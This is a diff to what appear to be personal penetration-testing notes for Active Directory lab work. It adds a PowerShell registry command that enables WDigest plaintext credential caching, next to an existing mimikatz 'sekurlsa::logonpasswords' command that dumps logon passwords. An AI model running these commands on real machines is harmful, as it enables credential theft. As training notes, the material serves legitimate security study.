@@ -11,6 +11,15 @@ run it then exit:
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
+
+> we can use the following to display plain text 
+> [ref](https://forum.hackthebox.com/t/active-directory-skills-assessment-i/257250/132):
+```powershell
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+#check:
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
+```
 ---
 ### OPTH
 ```powershell
